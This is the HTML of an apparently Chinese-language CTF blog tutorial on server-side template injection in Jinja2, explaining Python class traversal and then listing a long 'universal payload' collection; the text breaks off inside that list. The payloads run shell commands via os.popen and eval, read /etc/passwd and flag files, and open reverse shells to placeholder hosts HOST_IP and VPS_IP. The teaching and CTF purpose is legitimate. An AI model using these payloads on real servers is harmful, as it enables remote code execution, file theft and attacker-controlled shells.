@@ -1,0 +1,866 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    SSTI注入 | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="SSTI注入 简述：SSTI（Server-Side Template Injection） 服务器端模板注入，攻击者能够向服务器端模板引擎注入恶意模板代码，从而在服务器端执行任意代码。  一、前置基础 首先我们要知道什么是模板。 模板 是一种用于生成动态内容的工具。 它们通常包含两个基本部分：静态内容和动态占位符。 如图：绿色 部分为 静态内容 ，而 橙色 部分则是 动态占位符  模板的主要作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI注入">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/03/13/SSTI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="SSTI注入 简述：SSTI（Server-Side Template Injection） 服务器端模板注入，攻击者能够向服务器端模板引擎注入恶意模板代码，从而在服务器端执行任意代码。  一、前置基础 首先我们要知道什么是模板。 模板 是一种用于生成动态内容的工具。 它们通常包含两个基本部分：静态内容和动态占位符。 如图：绿色 部分为 静态内容 ，而 橙色 部分则是 动态占位符  模板的主要作">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hello-ctf.com/hc-web/assets/image-20231128133158187.png">
+<meta property="og:image" content="https://img2024.cnblogs.com/blog/3450162/202407/3450162-20240717154937641-936215290.png">
+<meta property="article:published_time" content="2026-03-13T01:54:17.000Z">
+<meta property="article:modified_time" content="2026-03-22T06:38:17.172Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="web漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hello-ctf.com/hc-web/assets/image-20231128133158187.png">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj+vDDLIL+xBGQU/voDBY5XE2lVh" crossorigin="anonymous">
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/atom.xml">
+          <span class="main-nav-link">rss</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="SSTI注入">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">SSTI注入</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+      <meting-js
+        theme="var(--color-link)"
+        id="6868625065"
+        server="netease"
+        type="playlist"
+        
+        
+        autoplay="false"
+        loop="all"
+        order="list"
+        
+        volume="0.7"
+        mutex="true"
+        
+        
+      ></meting-js>
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> SSTI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ssti%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、SSTI注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8-payload-python3"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 通用 payload ( Python3 )</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BC%96"><span class="toc-number">1.3.</span> <span class="toc-text"> 二编：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 常见payload：</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-SSTI注入" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-03-13T01:54:17.000Z" itemprop="datePublished">2026-03-13</time>
+    <time style="display: none;" id="post-update-time">2026-03-22</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="ssti注入"><a class="markdownIt-Anchor" href="#ssti注入"></a> SSTI注入</h1>
+<p>简述：<strong>SSTI（Server-Side Template Injection）</strong></p>
+<p>服务器端模板注入，攻击者能够向服务器端模板引擎注入恶意模板代码，从而在服务器端执行任意代码。</p>
+<h2 id="一-前置基础"><a class="markdownIt-Anchor" href="#一-前置基础"></a> 一、前置基础</h2>
+<p>首先我们要知道什么是模板。</p>
+<p><strong>模板</strong> 是一种用于生成动态内容的工具。</p>
+<p>它们通常包含两个基本部分：静态内容和动态占位符。</p>
+<p>如图：<strong>绿色</strong> 部分为 <strong>静态内容</strong> ，而 <strong>橙色</strong> 部分则是 <strong>动态占位符</strong></p>
+<p><img src="https://hello-ctf.com/hc-web/assets/image-20231128133158187.png" alt="image-20231128133158187" /></p>
+<p>模板的主要作用是分离业务逻辑和展示逻辑，使得前端开发者和后端开发者可以并行工作，同时也使得代码更易于维护。</p>
+<p>静态部分：由前端开发者设计，包括HTML、CSS、JavaScript等。 动态部分：由后端开发者提供数据，模板引擎将数据填充到模板中，生成最终的页面。</p>
+<p><strong>模板引擎的工作流程</strong></p>
+<p>1.解析模板：将模板文件解析成抽象语法树（AST）或类似的内部表示。</p>
+<p>2.处理指令：执行模板中的指令（如循环、条件判断等）。</p>
+<p>3.替换占位符：将占位符替换为实际的值。</p>
+<p>4.输出结果：将处理后的模板输出为字符串（如HTML）。</p>
+<p><strong>模板注入攻击成功的关键，在于攻击者输入的内容（如3）能够被模板引擎解析并生成抽象语法树（AST），而不仅仅是作为纯文本处理，AST是连接模板语法和底层代码执行的桥梁。攻击者的输入被解析成AST只是第一步，而真正执行这个AST并使其产生效果的，是模板引擎的代码生成器或解释器</strong>。</p>
+<p>eg.[HNCTF 2022 WEEK2]ez_SSTI</p>
+<p>传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:28434/?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>返回49，说明存在服务器端模版注入。</p>
+<h2 id="二-ssti注入流程"><a class="markdownIt-Anchor" href="#二-ssti注入流程"></a> 二、SSTI注入流程</h2>
+<ol>
+<li><strong>信息收集</strong>：
+<ul>
+<li>确定目标使用的编程语言和模板引擎（如 Flask 使用 Jinja2）。</li>
+<li>测试注入点：URL 参数、表单、评论区、HTTP 请求头等。</li>
+<li>提交测试 payload：<code>&#123;&#123;7*7&#125;&#125;</code>或 <code>&#123;% print(1+1) %&#125;</code>，观察是否被解析。</li>
+</ul>
+</li>
+<li><strong>了解模板引擎特性</strong>：
+<ul>
+<li><strong>Jinja2</strong>：支持 Python 反射（如 <code>__class__</code>, <code>__globals__</code>）。</li>
+<li><strong>Twig</strong>：支持过滤器和回调函数。</li>
+<li><strong>FreeMarker</strong>：支持 Java 类调用（如 <code>?new()</code>）。</li>
+</ul>
+</li>
+</ol>
+<p>3.<strong>确认漏洞</strong>：</p>
+<ul>
+<li>
+<p>请求：<code>http://example.com/?name=&#123;&#123;7*7&#125;&#125;</code></p>
+</li>
+<li>
+<p>响应：<code>49</code>（表明 Jinja2 SSTI 漏洞存在）。</p>
+<p>4.<strong>构造 payload</strong>：</p>
+</li>
+<li>
+<p>读取配置：<code>&#123;&#123; config &#125;&#125;</code></p>
+</li>
+<li>
+<p>执行命令：<code>&#123;&#123; ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('whoami').read() &#125;&#125;</code></p>
+<p>5.<strong>触发执行</strong></p>
+</li>
+</ul>
+<p>在具体说明之前，我们简要说明一下类之间的继承关系，因为在后面的攻击中用到的就是这种继承关系的不断调用最终达到一个rce的效果。</p>
+<p>eg.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class A:pass</span><br><span class="line">class B(A):pass</span><br><span class="line">class C(B):pass</span><br><span class="line">class D(C):pass</span><br></pre></td></tr></table></figure>
+<p>我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过__class__魔术方法来找到它的当前类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class A:pass</span><br><span class="line">class B(A):pass</span><br><span class="line">class C(B):pass</span><br><span class="line">class D(C):pass</span><br><span class="line">c=C()</span><br><span class="line">print(c.__class__)</span><br></pre></td></tr></table></figure>
+<p>它返回了一个当前的类为C，我们还可以通过__base__这个魔术方法来找到当前类的父类:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class A:pass</span><br><span class="line">class B(A):pass</span><br><span class="line">class C(B):pass</span><br><span class="line">class D(C):pass</span><br><span class="line">c=C()</span><br><span class="line">print(c.__class__.__base__)</span><br></pre></td></tr></table></figure>
+<p>找到了C类的父类B类，如果还想要找B类的父类可以接着使用__base__魔术方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class A:pass</span><br><span class="line">class B(A):pass</span><br><span class="line">class C(B):pass</span><br><span class="line">class D(C):pass</span><br><span class="line">c=C()</span><br><span class="line">print(c.__class__.__base__.__base__)</span><br></pre></td></tr></table></figure>
+<p>当然这样一个一个递进上去的方法有一些麻烦，所以我们可以使用__mro__魔术方法来一步到位看到类的所有父类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class A:pass</span><br><span class="line">class B(A):pass</span><br><span class="line">class C(B):pass</span><br><span class="line">class D(C):pass</span><br><span class="line">c=C()</span><br><span class="line">print(c.__class__.__mro__)</span><br></pre></td></tr></table></figure>
+<p>以数组形式在后面加上下标就能拿到指定的类了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class A:pass</span><br><span class="line">class B(A):pass</span><br><span class="line">class C(B):pass</span><br><span class="line">class D(C):pass</span><br><span class="line">c=C()</span><br><span class="line">print(c.__class__.__mro__[3])</span><br></pre></td></tr></table></figure>
+<p>我们在拿到object类后就可以通过object类来查找python中的所有object类的子类，当然这其中会有我们能通过该类rce的子类。我们通过__subclasses__来获取当前类的所有子类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class A:pass</span><br><span class="line">class B(A):pass</span><br><span class="line">class C(B):pass</span><br><span class="line">class D(C):pass</span><br><span class="line">c=C()</span><br><span class="line">print(c.__class__.__mro__[3].__subclasses__())</span><br></pre></td></tr></table></figure>
+<p>可以发现有很多类，前面我们也说到了python的所有类最终都是继承object类的，因此这里存在大量的类，我们最终的目的是要去进行rce</p>
+<p>常见魔术方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__   ：返回类型所属的对象</span><br><span class="line">__mro__     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   ：返回该对象所继承的父类</span><br><span class="line">__mro__     ：返回该对象的所有父类</span><br><span class="line"></span><br><span class="line">__subclasses__()  获取当前类的所有子类</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含(保存)函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
+<h4 id="通用-payload-python3"><a class="markdownIt-Anchor" href="#通用-payload-python3"></a> 通用 payload ( Python3 )<a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/ssti/#payload-python3">¶</a></h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"># 命令执行_eval</span><br><span class="line"> &#123;% for x in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% if x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;eval&#x27; in x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 命令执行_os.py</span><br><span class="line">&#123;% for x in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% if x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;os&#x27; in x.__init__.__globals__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 命令执行_popen</span><br><span class="line">&#123;% for x in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% if x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;popen&#x27; in x.__init__.__globals__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 命令执行__frozen_importlib.BuiltinImporter</span><br><span class="line">&#123;% for x in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% if &#x27;BuiltinImporter&#x27; in x.__name__ %&#125;</span><br><span class="line">        &#123;&#123; x[&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls /&quot;).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 命令执行_linecache</span><br><span class="line">&#123;% for x in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% if x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;linecache&#x27; in x.__init__.__globals__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read() &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 命令执行_exec(无回显故反弹shell)</span><br><span class="line">&#123;% for x in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% if x.__init__ is defined and x.__init__.__globals__ is defined and &#x27;exec&#x27; in x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[216].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPS_IP&quot;,端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 命令执行_catch_warnings </span><br><span class="line">&#123;% for x in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &#x27;war&#x27; in x.__name__ %&#125;&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># catch_warnings 读取文件</span><br><span class="line">&#123;% for x in [].__class__.__base__.__subclasses__() %&#125;&#123;% if x.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/app/flag&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># _frozen_importlib_external.FileLoader 读取文件</span><br><span class="line"> &#123;% for x in [].__class__.__base__.__subclasses__() %&#125; # &#123;% for x in [].__class__.__bases__[0].__subclasses__() %&#125;</span><br><span class="line">    &#123;% if &#x27;FileLoader&#x27; in x.__name__ %&#125;</span><br><span class="line">        &#123;&#123; x[&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)&#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 其他RCE</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;application.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;self.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span 